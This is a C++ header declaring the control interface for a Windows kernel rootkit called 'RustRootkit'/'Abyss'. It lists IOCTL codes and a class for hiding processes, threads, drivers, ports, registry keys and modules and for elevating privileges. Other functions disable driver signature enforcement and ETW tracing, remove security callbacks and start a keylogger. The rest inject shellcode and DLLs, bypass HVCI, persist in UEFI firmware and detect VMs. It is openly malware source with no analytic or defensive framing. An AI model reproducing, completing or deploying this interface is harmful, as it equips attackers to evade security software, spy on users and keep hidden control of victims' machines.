#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>

// --- IOCTL CODES (Annie's Fixed Versions) ---
#define ABYSS_CTL_CODE(x) CTL_CODE(FILE_DEVICE_UNKNOWN, x, METHOD_NEITHER, FILE_ANY_ACCESS)

constexpr DWORD IO_ELEVATE    = 0x222000;
constexpr DWORD IO_HIDE_PROC  = 0x222004;
constexpr DWORD IO_TERM_PROC  = 0x222008;
constexpr DWORD IO_SIG_PROC   = 0x22200C;
constexpr DWORD IO_PROT_PROC  = 0x222010;
constexpr DWORD IO_ENUM_PROC  = 0x222014;
constexpr DWORD IO_PROT_THR   = 0x222044;
constexpr DWORD IO_HIDE_THR   = 0x222048;
constexpr DWORD IO_ENUM_THR   = 0x22204C;
constexpr DWORD IO_HIDE_DRV   = 0x222084;
constexpr DWORD IO_ENUM_DRV   = 0x222088;
constexpr DWORD IO_BLOCK_DRV  = 0x22208C;
constexpr DWORD IO_DSE_SET    = 0x2220C4;
constexpr DWORD IO_KEYLOG     = 0x220104; // METHOD_BUFFERED
constexpr DWORD IO_ETW_SET    = 0x222144;
constexpr DWORD IO_PORT_HIDE  = 0x222184;
constexpr DWORD IO_CB_ENUM    = 0x2221C4;
constexpr DWORD IO_CB_REM     = 0x2221C8;
constexpr DWORD IO_CB_RES     = 0x2221CC;
constexpr DWORD IO_CB_REMLIST = 0x2221D0;
constexpr DWORD IO_REG_VAL_P  = 0x222204;
constexpr DWORD IO_REG_KEY_P  = 0x222208;
constexpr DWORD IO_REG_KEY_H  = 0x22220C;
constexpr DWORD IO_REG_VAL_H  = 0x222210;
constexpr DWORD IO_MOD_ENUM   = 0x222244;
constexpr DWORD IO_MOD_HIDE   = 0x222248;
constexpr DWORD IO_INJ_SH_T   = 0x222404;
constexpr DWORD IO_INJ_SH_A   = 0x222408;
constexpr DWORD IO_INJ_SH_H   = 0x22240C;
constexpr DWORD IO_INJ_DLL_T  = 0x222410;
constexpr DWORD IO_INJ_DLL_A  = 0x222414;
constexpr DWORD IO_HVCI_OFF   = 0x222444;
constexpr DWORD IO_UEFI_SET   = 0x222448;
constexpr DWORD IO_AV_CHECK   = 0x22244C;

namespace Abyss {
    enum class CB_TYPE : int {
        Process = 0, Thread, Image, Registry, ObProcess, ObThread
    };
    enum class OPT_TYPE : int {
        Hide = 0, Protection
    };
    enum class PROTO : int {
        TCP = 0, UDP
    };
    enum class PORT_TYPE : int {
        LOCAL = 0, REMOTE
    };
}

#pragma pack(push, 8)
struct DSE {
    bool enable;
};

struct ETWTI {
    bool enable;
};

struct TargetProcess {
    size_t pid;
    bool enable;
    size_t sg;
    size_t tp;
    size_t list_entry;
    Abyss::OPT_TYPE options;
};

struct TargetThread {
    size_t tid;
    bool enable;
    size_t list_entry;
    Abyss::OPT_TYPE options;
};

struct TargetDriver {
    wchar_t name[256];
    bool enable;
    size_t list_entry;
    size_t driver_entry;
};

struct DriverInfo {
    size_t address;
    wchar_t name[256];
    uint8_t index;
};

struct TargetPort {
    Abyss::PROTO protocol;
    int port_type;
    unsigned short port_number;
    bool enable;
};

struct TargetRegistry {
    wchar_t key[256];
    wchar_t value[256];
    bool enable;
};

struct CallbackInfoInput {
    size_t index;
    Abyss::CB_TYPE callback;
};

struct CallbackInfoOutput {
    size_t address;
    wchar_t name[256];
    uint8_t index;
    size_t pre_operation;
    size_t post_operation;
};

struct ModuleInfo {
    size_t address;
    wchar_t name[256];
    uint8_t index;
};

struct TargetModule {
    size_t pid;
    wchar_t module_name[256];
};

struct TargetInjection {
    size_t pid;
    wchar_t path[256];
};
#pragma pack(pop)

class RustRootkit {
public:
    RustRootkit();
    ~RustRootkit();
    bool Initialize();
    void Close();
    bool ElevateProcess(size_t pid);
    bool HideProcess(size_t pid);
    bool UnhideProcess(size_t pid);
    bool TerminateProcess(size_t pid);
    bool SetProcessSignature(size_t pid, size_t signer, size_t type);
    bool ProtectProcess(size_t pid, bool enable);
    std::vector<TargetProcess> EnumerateProcesses(Abyss::OPT_TYPE option);
    bool HideThread(size_t tid);
    bool UnhideThread(size_t tid);
    bool ProtectThread(size_t tid, bool enable);
    std::vector<TargetThread> EnumerateThreads(Abyss::OPT_TYPE option);
    bool HideDriver(const std::wstring& name);
    bool UnhideDriver(const std::wstring& name);
    bool BlockDriver(const std::wstring& name, bool enable);
    std::vector<DriverInfo> EnumerateDrivers();
    bool SetDSE(bool enable);
    size_t InitKeylogger();
    bool SetETWTI(bool enable);
    bool HidePort(unsigned short port, Abyss::PROTO proto, int type, bool enable);
    std::vector<CallbackInfoOutput> EnumerateCallbacks(Abyss::CB_TYPE type);
    std::vector<CallbackInfoOutput> EnumerateRemovedCallbacks(Abyss::CB_TYPE type);
    bool RemoveCallback(Abyss::CB_TYPE type, size_t index);
    bool RestoreCallback(Abyss::CB_TYPE type, size_t index);
    bool ProtectRegistryValue(const std::wstring& key, const std::wstring& value, bool enable);
    bool ProtectRegistryKey(const std::wstring& key, bool enable);
    bool HideRegistryKey(const std::wstring& key, bool enable);
    bool HideRegistryValue(const std::wstring& key, const std::wstring& value, bool enable);
    std::vector<ModuleInfo> EnumerateModules(size_t pid);
    bool HideModule(size_t pid, const std::wstring& moduleName);
    bool InjectShellcodeThread(size_t pid, const std::wstring& path);
    bool InjectShellcodeAPC(size_t pid, const std::wstring& path);
    bool InjectShellcodeHijack(size_t pid, const std::wstring& path);
    bool InjectDLLThread(size_t pid, const std::wstring& path);
    bool InjectDLLAPC(size_t pid, const std::wstring& path);
    bool BypassHVCI(size_t pid);
    bool PersistUEFI(const std::wstring& path);
    bool CheckAntiVM();
private:
    HANDLE hDevice;
    bool SendIoctl(DWORD code, void* in, size_t inSize, void* out = nullptr, size_t outSize = 0, DWORD* bytesReturned = nullptr);
};
